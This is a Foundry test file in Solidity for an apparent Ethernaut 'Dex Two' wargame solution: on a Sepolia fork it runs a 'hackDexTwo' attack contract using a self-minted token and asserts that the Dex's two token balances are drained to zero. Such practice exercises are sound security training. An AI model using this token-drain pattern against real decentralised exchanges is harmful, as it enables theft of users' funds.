//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;
// run this only on a fork seplia network;
import "forge-std/Test.sol";
import "forge-std/console.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {hackDexTwo} from "../../src/ethernaut/dexTwo.sol";

contract testHackDex is Test {
    hackDexTwo hack;
    IERC20 token3;
    string sepolia_url = vm.envString("sepolia_url");
    uint fork;

    function setUp() public {
        fork = vm.createFork(sepolia_url);
        vm.selectFork(fork);
        hack = new hackDexTwo();
        token3 = IERC20(hack.addresstoken3());
    }

    function test__attack() public {
        assertEq(vm.activeFork(), fork);
        address dex = 0xb9096644e3872c8298f75218c7394D59901c80ae;
        address token1 = 0x27EfEA40C1e2aC13AFf470f0fA8FEB162dad8d5c;
        address token2 = 0x1A0e45284be177ec9652dB0c94aad25EB51d4309;
        uint bal = token3.balanceOf(address(hack));
        console.log(bal, "this is the minted balance");
        assertEq(bal, 5000);
        hack.attack();
        uint allowance = token3.allowance(address(hack), dex);
        console.log("allowance after process", allowance);
        assertEq(allowance, 4700);
        (, bytes memory data) = token1.call(
            abi.encodeWithSignature("balanceOf(address)", dex)
        );
        uint balanceToken1 = abi.decode(data, (uint));
        (, bytes memory Data) = token2.call(
            abi.encodeWithSignature("balanceOf(address)", dex)
        );
        uint balanceToken2 = abi.decode(Data, (uint));
        console.log("balances:");
        console.log("token1:", balanceToken1);
        console.log("token2", balanceToken2);
        assertEq(balanceToken1, 0);
        assertEq(balanceToken2, 0);
    }
}
